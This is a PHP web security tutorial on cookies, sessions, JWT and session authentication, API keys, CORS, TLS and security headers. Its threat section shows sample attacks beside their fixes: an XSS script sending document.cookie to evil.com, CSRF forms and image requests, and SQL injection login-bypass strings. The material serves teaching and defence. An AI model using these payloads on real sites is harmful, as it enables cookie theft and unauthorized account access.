# Modern Web Communication — Part 3: Cookies, Sessions, Authentication & Security

State management and security are where most full stack developers spend significant time. HTTP is stateless — yet every modern app remembers who you are across requests. This part explains how that works and how to do it securely.

---

## Table of Contents

1. [The Stateless Problem](#the-stateless-problem)
2. [Cookies — In Depth](#cookies--in-depth)
3. [Sessions — In Depth](#sessions--in-depth)
4. [Authentication Patterns](#authentication-patterns)
   - [Session-Based Auth](#session-based-auth)
   - [Token-Based Auth (JWT)](#token-based-auth-jwt)
   - [API Keys](#api-keys)
5. [CORS — Cross-Origin Resource Sharing](#cors--cross-origin-resource-sharing)
6. [Common Web Security Threats](#common-web-security-threats)
   - [XSS](#xss-cross-site-scripting)
   - [CSRF](#csrf-cross-site-request-forgery)
   - [SQL Injection](#sql-injection)
   - [Clickjacking](#clickjacking)
7. [HTTPS & TLS Deep Dive](#https--tls-deep-dive)
8. [Security Headers Checklist](#security-headers-checklist)
9. [Quick Revision](#quick-revision)

---

## The Stateless Problem

HTTP is **stateless** — each request is completely independent. The server has no memory of previous requests by default.

```
Request 1: GET /login     → Server processes → Response → FORGOTTEN
Request 2: GET /dashboard → Server has no idea who you are!
```

This creates a fundamental problem: how does a server know that request 2 came from the same user who logged in on request 1?

**Solutions:**
- **Cookies** — browser stores a small piece of data, sends it with every request
- **Sessions** — server stores state, browser carries only a session ID
- **Tokens (JWT)** — browser stores a self-contained signed token, sends it with every request

---

## Cookies — In Depth

A **cookie** is a small key-value pair that the server tells the browser to store — the browser automatically sends it back with every subsequent request to that domain.

### Cookie Lifecycle

```
1. Server sends Set-Cookie header in a response
        ↓
2. Browser stores the cookie
        ↓
3. On every future request to that domain, browser automatically
   includes Cookie header with all stored cookies
        ↓
4. Server reads cookies from the Cookie request header
```

```php
<?php
// Setting a cookie
setcookie(
    name:     "user_pref",
    value:    "dark_mode",
    expires:  time() + (86400 * 30),  // 30 days from now
    path:     "/",                     // Available on all pages of this domain
    domain:   "example.com",          // Also sent to subdomains if ".example.com"
    secure:   true,                    // HTTPS only — never sent over plain HTTP
    httponly: true                     // Cannot be accessed by JavaScript (blocks XSS)
);

// Reading a cookie
$theme = $_COOKIE["user_pref"] ?? "light_mode";

// Deleting a cookie (set expiry in the past)
setcookie("user_pref", "", time() - 3600, "/");
?>
```

The raw HTTP headers for the above:

```http
// Server sends:
Set-Cookie: user_pref=dark_mode; Expires=Mon, 28 Jul 2026 10:00:00 GMT; Path=/; Secure; HttpOnly

// Browser sends on every future request:
Cookie: user_pref=dark_mode; session_id=abc123; cart_id=xyz
```

### Cookie Attributes Explained

| Attribute | Purpose | Security Impact |
|---|---|---|
| `Expires` / `Max-Age` | When the cookie expires | Session cookie (no expiry) deleted when browser closes |
| `Domain` | Which domain(s) receive this cookie | Be specific — don't set `.example.com` unless subdomains need it |
| `Path` | Which URL paths send this cookie | `/` = all paths; `/admin` = admin paths only |
| `Secure` | Only send over HTTPS | Prevents cookie being sent over plain HTTP (man-in-the-middle) |
| `HttpOnly` | JS cannot access this cookie | Blocks XSS attacks from reading the cookie via `document.cookie` |
| `SameSite` | Controls cross-origin sending | `Strict` = only same-site; `Lax` = same-site + top-level nav; `None` = always (requires Secure) |

```php
<?php
// The most secure cookie configuration — use this for auth cookies
setcookie(
    "session_id",
    session_id(),
    [
        "expires"  => time() + 3600,
        "path"     => "/",
        "secure"   => true,       // HTTPS only
        "httponly" => true,       // No JS access
        "samesite" => "Strict",   // CSRF protection
    ]
);
?>
```

### SameSite Attribute — Critical for CSRF

- `SameSite=Strict` — cookie only sent when navigating within the same site. Most secure.
- `SameSite=Lax` — cookie sent on same-site requests AND when navigating from external links (top-level GET requests). Good balance for most apps.
- `SameSite=None; Secure` — cookie sent on all requests, including cross-origin. Required for third-party cookies (e.g., embedded widgets, OAuth). Must be used with `Secure`.

> 💡 **Default since 2021:** Modern browsers default to `SameSite=Lax` if you don't specify it. But always set it explicitly to make your intent clear.

---

## Sessions — In Depth

A **session** stores data on the **server**. The browser only holds a session ID (a random token) in a cookie. The server uses that ID to look up the session data.

```
┌────────────────────────────────────────────────────────────┐
│                      HOW SESSIONS WORK                     │
│                                                            │
│  Browser                        Server                     │
│                                                            │
│  POST /login ──────────────────►                           │
│                                 Validates credentials      │
│                                 Creates session:           │
│                                 sess_abc123 = {            │
│                                   user_id: 42,             │
│                                   role: "admin",           │
│                                   logged_in: true          │
│                                 }                          │
│  ◄──────────── Set-Cookie: PHPSESSID=sess_abc123; HttpOnly │
│                                                            │
│  GET /dashboard ───────────────►                           │
│  Cookie: PHPSESSID=sess_abc123                             │
│                                 Reads session file:        │
│                                 sess_abc123 → {user:42}   │
│                                 User is authenticated! ✅  │
│  ◄──────────── 200 OK + dashboard HTML                    │
└────────────────────────────────────────────────────────────┘
```

### Session Storage Options

```php
<?php
// Default: session data stored in files on server
// Location: /var/lib/php/sessions/ (Linux)
// File: sess_abc123 (one file per session)

// Better for production — store sessions in Redis
// (Works across multiple servers — essential for load balancing)
ini_set("session.save_handler", "redis");
ini_set("session.save_path", "tcp://127.0.0.1:6379");

// Or configure in php.ini:
// session.save_handler = redis
// session.save_path = "tcp://127.0.0.1:6379"

session_start();

$_SESSION["user_id"]  = 42;
$_SESSION["username"] = "Phyo";
$_SESSION["role"]     = "admin";
?>
```

### Session Security Best Practices

```php
<?php
session_start();

// 1. Regenerate session ID after login (prevents session fixation)
function login(string $username, string $password): bool {
    $user = validateCredentials($username, $password);

    if ($user) {
        // Regenerate the session ID — CRITICAL security step
        session_regenerate_id(true);  // true = delete old session file

        $_SESSION["user_id"]  = $user["id"];
        $_SESSION["username"] = $user["username"];
        $_SESSION["role"]     = $user["role"];
        $_SESSION["login_at"] = time();
        $_SESSION["ip"]       = $_SERVER["REMOTE_ADDR"];
        return true;
    }
    return false;
}

// 2. Validate IP hasn't changed (detect session hijacking)
function isSessionValid(): bool {
    if (!isset($_SESSION["user_id"])) return false;

    // Optional: check IP matches (careful with mobile users who change IPs)
    if ($_SESSION["ip"] !== $_SERVER["REMOTE_ADDR"]) {
        session_destroy();
        return false;
    }

    // 3. Session timeout — expire after 30 minutes of inactivity
    if (isset($_SESSION["last_activity"]) &&
        time() - $_SESSION["last_activity"] > 1800) {
        session_destroy();
        return false;
    }

    $_SESSION["last_activity"] = time();
    return true;
}

// 4. Proper logout
function logout(): void {
    session_start();
    $_SESSION = [];
    session_destroy();

    // Delete the session cookie too
    setcookie(session_name(), "", time() - 3600, "/", "", true, true);

    header("Location: /login");
    exit();
}
?>
```

---

## Authentication Patterns

### Session-Based Auth

The traditional web approach — server stores login state.

```
┌─────────────────────────────────────────────────────────────┐
│                SESSION-BASED AUTH FLOW                      │
│                                                             │
│  1. User submits login form (POST /login)                   │
│  2. Server validates credentials against database           │
│  3. Server creates a session: stores user data server-side  │
│  4. Server sends session ID cookie to browser               │
│  5. Browser sends cookie on every subsequent request        │
│  6. Server looks up session ID → retrieves user data        │
│  7. Server knows who the user is ✅                         │
└─────────────────────────────────────────────────────────────┘
```

```php
<?php
// Full session-based auth example
session_start();

// Login endpoint
if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["action"] === "login") {
    $username = trim($_POST["username"] ?? "");
    $password = $_POST["password"] ?? "";

    // Validate
    if (empty($username) || empty($password)) {
        die("Username and password required");
    }

    // Fetch user from database (using prepared statements)
    $stmt = $pdo->prepare("SELECT id, username, password_hash, role
                           FROM users WHERE username = ? AND active = 1");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // Verify password
    if ($user && password_verify($password, $user["password_hash"])) {
        session_regenerate_id(true);  // Prevent session fixation
        $_SESSION["user_id"]      = $user["id"];
        $_SESSION["username"]     = $user["username"];
        $_SESSION["role"]         = $user["role"];
        $_SESSION["last_activity"] = time();

        header("Location: /dashboard");
        exit();
    }

    // Generic error — don't say "wrong password" (security)
    echo "Invalid username or password";
}

// Protect a page
function requireLogin(): void {
    session_start();
    if (!isset($_SESSION["user_id"])) {
        header("Location: /login?redirect=" . urlencode($_SERVER["REQUEST_URI"]));
        exit();
    }
}
?>
```

**When to use:** Traditional multi-page websites, server-rendered apps.
**Limitation:** Hard to use across multiple domains; requires shared session store when scaling.

---

### Token-Based Auth (JWT)

**JWT** (JSON Web Token) is a self-contained token that stores user information — no server-side session storage needed.

```
┌─────────────────────────────────────────────────────────────┐
│                    JWT STRUCTURE                            │
│                                                             │
│  eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Mn0.SflKxwRJSMeKKF2 │
│  └────────────────┘  └──────────────────┘  └──────────────┘ │
│        HEADER            PAYLOAD             SIGNATURE       │
│   (algorithm info)  (user data/claims)   (verification)     │
└─────────────────────────────────────────────────────────────┘

Decoded:
Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "user_id": 42, "role": "admin", "exp": 1756000000 }
Signature: HMACSHA256(base64(header) + "." + base64(payload), SECRET_KEY)
```

```
JWT AUTH FLOW:

1. User logs in → Server validates → Signs a JWT with a secret key
2. Server sends JWT to client (in response body or cookie)
3. Client stores JWT (localStorage or HttpOnly cookie)
4. Client sends JWT in every request: Authorization: Bearer <token>
5. Server receives request → validates JWT signature
6. If valid → extract user data from payload → process request
7. NO database lookup needed for every request! ✅ (Stateless)
```

```php
<?php
// Simple JWT implementation concept (use firebase/php-jwt in real projects)
define("JWT_SECRET", getenv("JWT_SECRET_KEY"));

function createJWT(array $payload): string {
    $header    = base64url_encode(json_encode(["alg" => "HS256", "typ" => "JWT"]));
    $payload["exp"] = time() + 3600;  // Expires in 1 hour
    $payload["iat"] = time();          // Issued at
    $claims    = base64url_encode(json_encode($payload));
    $signature = base64url_encode(hash_hmac("sha256", "$header.$claims", JWT_SECRET, true));
    return "$header.$claims.$signature";
}

function verifyJWT(string $token): ?array {
    $parts = explode(".", $token);
    if (count($parts) !== 3) return null;

    [$header, $payload, $signature] = $parts;

    // Verify signature
    $expectedSig = base64url_encode(hash_hmac("sha256", "$header.$payload", JWT_SECRET, true));
    if (!hash_equals($expectedSig, $signature)) return null;

    $claims = json_decode(base64url_decode($payload), true);

    // Check expiry
    if (isset($claims["exp"]) && $claims["exp"] < time()) return null;

    return $claims;
}

// Usage
$token = createJWT(["user_id" => 42, "role" => "admin"]);

// On protected routes:
$authHeader = $_SERVER["HTTP_AUTHORIZATION"] ?? "";
if (str_starts_with($authHeader, "Bearer ")) {
    $token  = substr($authHeader, 7);
    $claims = verifyJWT($token);

    if ($claims) {
        $userId = $claims["user_id"];  // No DB query needed!
    } else {
        http_response_code(401);
        echo json_encode(["error" => "Invalid or expired token"]);
        exit();
    }
}
?>
```

**When to use:** REST APIs, single-page apps (React, Vue), mobile apps, microservices.

### Session vs JWT

| Feature | Session-Based | JWT (Token-Based) |
|---|---|---|
| State stored | Server (file/Redis) | Client (token itself) |
| Scalability | Needs shared store for load balancing | Stateless — scales naturally |
| Logout | Easy — delete server session | Harder — can't "invalidate" a token easily |
| Token size | Tiny (session ID only) | Larger (contains all claims) |
| DB lookup per request | Yes (to load session data) | No (data in token) |
| Best for | Multi-page web apps | APIs, SPAs, mobile apps |

---

### API Keys

- Simple authentication for machine-to-machine communication (no user involved).
- A long random string given to a developer/service to authenticate their API calls.

```php
<?php
// Generating a secure API key
$apiKey = bin2hex(random_bytes(32));  // 64-character hex string

// Storing in database (hash it like a password!)
$hashedKey = hash("sha256", $apiKey);
// Store $hashedKey in the database, send $apiKey once to the user

// Validating an API key on each request
function validateApiKey(): ?array {
    $key = $_SERVER["HTTP_X_API_KEY"]          // Custom header: X-API-Key: <key>
        ?? getBearerToken()                      // Or: Authorization: Bearer <key>
        ?? ($_GET["api_key"] ?? null);           // Or: ?api_key=<key> (less secure)

    if (!$key) {
        http_response_code(401);
        echo json_encode(["error" => "API key required"]);
        exit();
    }

    $hashedKey = hash("sha256", $key);
    $stmt = $pdo->prepare("SELECT * FROM api_keys WHERE key_hash = ? AND active = 1");
    $stmt->execute([$hashedKey]);
    return $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
}
?>
```

---

## CORS — Cross-Origin Resource Sharing

**CORS** is a browser security mechanism that controls which **external origins** (different domain/port/protocol) can access your API.

### The Same-Origin Policy

Without CORS, browsers block JavaScript from making requests to a different origin — protecting users from malicious websites reading their data from other sites.

```
Your app at: https://app.example.com
Makes request to: https://api.example.com

→ Different subdomain = different origin = CORS rules apply!
```

### The CORS Preflight Request

For "non-simple" requests (POST with JSON, requests with custom headers), the browser sends an **OPTIONS preflight** first to ask permission.

```
1. Browser sends preflight:
   OPTIONS /api/users HTTP/1.1
   Origin: https://app.example.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type, Authorization

2. Server responds with permission:
   HTTP/1.1 204 No Content
   Access-Control-Allow-Origin: https://app.example.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
   Access-Control-Allow-Headers: Content-Type, Authorization
   Access-Control-Max-Age: 86400   ← cache preflight for 24 hours

3. Browser sends actual request:
   POST /api/users HTTP/1.1
   Origin: https://app.example.com
   Content-Type: application/json
   Authorization: Bearer eyJhbGci...
```

```php
<?php
// PHP CORS middleware — add at the top of your API

function handleCORS(): void {
    $allowedOrigins = [
        "https://app.example.com",
        "https://admin.example.com",
    ];

    $origin = $_SERVER["HTTP_ORIGIN"] ?? "";

    if (in_array($origin, $allowedOrigins, true)) {
        header("Access-Control-Allow-Origin: $origin");
        header("Vary: Origin");  // Important: tells caches this varies by origin
    }

    header("Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
    header("Access-Control-Allow-Credentials: true");  // If sending cookies cross-origin
    header("Access-Control-Max-Age: 86400");

    // Handle preflight
    if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
        http_response_code(204);
        exit();
    }
}

handleCORS();
?>
```

> ⚠️ **Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`** — browsers will reject this combination. Either allow all origins (no credentials) or specific origins (with credentials).

---

## Common Web Security Threats

### XSS (Cross-Site Scripting)

An attacker injects malicious JavaScript into a page that other users see.

```php
<?php
// THE ATTACK: User submits this as their "username":
// <script>fetch("https://evil.com/steal?c=" + document.cookie)</script>

// ❌ VULNERABLE — outputs raw user input
echo "<p>Hello, " . $_POST["username"] . "</p>";
// → Browser executes the script → steals cookies!

// ✅ SAFE — escapes HTML special characters
echo "<p>Hello, " . htmlspecialchars($_POST["username"], ENT_QUOTES, "UTF-8") . "</p>";
// → Browser displays literal text: <script>fetch(...)</script>

// Content Security Policy — defense in depth
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
// → Even if XSS succeeds, CSP blocks execution of injected scripts
?>
```

---

### CSRF (Cross-Site Request Forgery)

An attacker tricks a logged-in user's browser into making unauthorized requests.

```html
<!-- The attack: attacker's website contains hidden form -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000">
<!-- When victim loads this page → browser sends GET with their session cookie! -->

<!-- Or via form auto-submit: -->
<form action="https://shop.example.com/orders/delete/42" method="POST">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

```php
<?php
// CSRF Protection — CSRF token pattern

// Generating a CSRF token (on page load)
function generateCsrfToken(): string {
    if (empty($_SESSION["csrf_token"])) {
        $_SESSION["csrf_token"] = bin2hex(random_bytes(32));
    }
    return $_SESSION["csrf_token"];
}

// Including token in a form
function csrfField(): string {
    return '<input type="hidden" name="csrf_token" value="'
        . htmlspecialchars(generateCsrfToken(), ENT_QUOTES, "UTF-8")
        . '">';
}

// Validating on form submission
function validateCsrfToken(): void {
    $submitted = $_POST["csrf_token"] ?? "";
    $expected  = $_SESSION["csrf_token"] ?? "";

    if (!hash_equals($expected, $submitted)) {
        http_response_code(403);
        die("CSRF token validation failed");
    }
}

// In your HTML form:
// <form method="POST" action="/delete-account">
//   <?= csrfField() ?>
//   <button type="submit">Delete</button>
// </form>
?>
```

---

### SQL Injection

An attacker manipulates your SQL query by injecting SQL code through user input.

```php
<?php
// THE ATTACK: User types this as their username:
// admin' --
// or: ' OR '1'='1

// ❌ VULNERABLE — string concatenation in SQL
$username = $_POST["username"];
$query    = "SELECT * FROM users WHERE username = '$username'";
// Becomes: SELECT * FROM users WHERE username = 'admin' --'
// Everything after -- is a comment → bypasses password check!

// Or: SELECT * FROM users WHERE username = '' OR '1'='1'
// → Always true → returns ALL users!

// ✅ SAFE — parameterized queries (prepared statements)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST["username"]]);
$user = $stmt->fetch();
// The ? placeholder is NEVER treated as SQL — pure data, always safe
?>
```

---

### Clickjacking

An attacker embeds your site in an invisible `<iframe>` on their page, tricking users into clicking your buttons.

```php
<?php
// Prevention: X-Frame-Options header
header("X-Frame-Options: DENY");       // Never allow framing
header("X-Frame-Options: SAMEORIGIN"); // Only allow framing by same site

// Modern alternative: CSP frame-ancestors
header("Content-Security-Policy: frame-ancestors 'none'");
header("Content-Security-Policy: frame-ancestors 'self'");
?>
```

---

## HTTPS & TLS Deep Dive

### The TLS Handshake (Simplified)

```
Browser                          Server
   │                                │
   │──── ClientHello ──────────────►│  "I support TLS 1.3, here are cipher suites"
   │                                │
   │◄─── ServerHello ───────────────│  "Let's use TLS 1.3 + AES-256-GCM"
   │◄─── Certificate ───────────────│  Server sends its SSL cert (signed by trusted CA)
   │◄─── ServerHelloDone ───────────│
   │                                │
   │  Browser verifies:             │
   │  ✅ Cert signed by trusted CA? │
   │  ✅ Cert not expired?           │
   │  ✅ Cert matches domain?        │
   │                                │
   │──── ClientKeyExchange ────────►│  Browser sends encrypted pre-master secret
   │──── ChangeCipherSpec ─────────►│  "Switching to encrypted mode"
   │──── Finished (encrypted) ─────►│
   │                                │
   │◄─── ChangeCipherSpec ──────────│  "I'm switching too"
   │◄─── Finished (encrypted) ──────│
   │                                │
   │══════ ENCRYPTED CHANNEL ══════│  All communication now encrypted
```

### What TLS Provides

- **Confidentiality** — data is encrypted; eavesdroppers see random bytes.
- **Integrity** — data cannot be tampered with in transit (any modification is detected).
- **Authentication** — the certificate proves you're talking to the real server, not an impostor.

---

## Security Headers Checklist

Every production PHP app should send these headers. Add them in Nginx config or your PHP bootstrap.

```php
<?php
// Security headers — add to every response
function setSecurityHeaders(): void {
    // Prevent MIME type sniffing
    header("X-Content-Type-Options: nosniff");

    // Prevent clickjacking
    header("X-Frame-Options: DENY");

    // Enable browser XSS filter (older browsers)
    header("X-XSS-Protection: 1; mode=block");

    // Force HTTPS for 1 year, including subdomains
    header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");

    // Content Security Policy — restrict what can load on your page
    header("Content-Security-Policy: " . implode("; ", [
        "default-src 'self'",
        "script-src 'self' 'nonce-{random}' https://cdn.example.com",
        "style-src 'self' https://fonts.googleapis.com",
        "img-src 'self' data: https:",
        "font-src 'self' https://fonts.gstatic.com",
        "connect-src 'self' https://api.example.com",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'",
    ]));

    // Control what info is sent in the Referer header
    header("Referrer-Policy: strict-origin-when-cross-origin");

    // Permissions Policy — disable unused browser features
    header("Permissions-Policy: camera=(), microphone=(), geolocation=()");

    // Remove server identity (add in Nginx: server_tokens off)
    header_remove("X-Powered-By");  // Hides "PHP/8.3.2"
    header_remove("Server");        // Remove server software info
}

setSecurityHeaders();
?>
```

### Security Headers Quick Reference

| Header | Purpose | Recommended Value |
|---|---|---|
| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |
| `X-Frame-Options` | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
| `Strict-Transport-Security` | Force HTTPS | `max-age=31536000; includeSubDomains` |
| `Content-Security-Policy` | Whitelist allowed content sources | Custom per app |
| `Referrer-Policy` | Control referrer info leakage | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Disable unused browser APIs | Deny what you don't use |
| `X-XSS-Protection` | Legacy XSS filter | `1; mode=block` |

---

## Quick Revision

- HTTP is **stateless** — state is maintained via cookies (client-side storage) or sessions (server-side storage with a cookie ID).
- **Cookies** are key-value pairs stored in the browser, sent automatically with every request. Always use `Secure`, `HttpOnly`, and `SameSite=Strict` for auth cookies.
- **Sessions** store data server-side; the browser only holds the session ID. Use Redis for shared session storage in load-balanced environments. Always call `session_regenerate_id(true)` after login.
- **Session-based auth** — best for multi-page web apps. **JWT** — best for APIs, SPAs, mobile apps (stateless, scales easily, but harder to revoke).
- **JWT** = Header.Payload.Signature — server signs the payload with a secret key; clients can't forge it. No DB lookup per request.
- **API keys** — for machine-to-machine auth; always hash before storing (like passwords).
- **CORS** — browser blocks cross-origin requests by default. Allow specific origins with `Access-Control-Allow-Origin`. Never use `*` with credentials.
- **Preflight (OPTIONS)** — browser sends this before non-simple cross-origin requests to check permissions. Always handle it.
- **XSS** — inject JavaScript via user input. Fix: `htmlspecialchars()` on output, Content-Security-Policy.
- **CSRF** — trick browser into making unwanted requests. Fix: CSRF tokens in forms, `SameSite` cookie attribute.
- **SQL Injection** — inject SQL via user input. Fix: **always** use prepared statements — never concatenate user input into SQL.
- **Clickjacking** — embed site in iframe to steal clicks. Fix: `X-Frame-Options: DENY` or CSP `frame-ancestors`.
- **TLS** provides confidentiality (encryption), integrity (tamper detection), and authentication (certificate = identity proof).
- Set all **security headers** in every production response: `HSTS`, `CSP`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`.
- Remove `X-Powered-By` and `Server` headers to avoid exposing server software version to attackers.